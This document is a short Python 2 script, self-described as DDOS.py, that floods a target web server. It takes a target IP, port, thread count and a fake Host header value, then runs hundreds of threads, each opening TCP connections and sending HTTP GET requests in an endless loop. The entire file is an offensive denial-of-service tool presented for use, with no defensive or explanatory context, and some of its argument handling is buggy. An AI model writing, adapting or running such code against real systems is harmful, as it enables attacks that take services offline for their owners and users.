#!/usr/bin/python

import sys
import getopt
import socket
import threading

targetip = ''
fakeip = '192.168.1.1'
port = 80
threads = 500


def main(argv):
    global targetip
    global fakeip
    global port
    global threads

    try:
        opts, args = getopt.getopt(argv,"h:i:f:p:t:",["targetip=", "fakeip=", "port=", "threads="])
    except getopt.GetoptError:
        print 'DDOS.py -i <TargetIP> -f <FakeHostIP> (default = 192.168.1.1) -p <port> (default = 80) -t <#threads> (default = 500)'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print 'DDOS.py -i <TargetIP> -f <FakeHostIP> (default = 192.168.1.1) -p <port> (default = 80) -t <#threads> (default = 500)'
            sys.exit()
        elif opt in ("-i", "--targetip"):
            targetip = arg
        elif opt in ("-f", "--fakeip"):
            fakeip = arg
        elif opt in ("-p", "--port"):
            port = arg
        elif opt in ("-t", "--threads"):
            threads = arg

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def attack():
    global targetip
    global fakeip
    global port
    global threads

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((targetip, port))
        s.sendto(("GET /" + targetip + " HTTP/1.1\r\n").encode('ascii'), (targetip, port))
        s.sendto(("Host: " + fakeip + "\r\n\r\n").encode('ascii'), (targetip, port))
        s.close()

if __name__ == "__main__":
    main(sys.argv[1:])
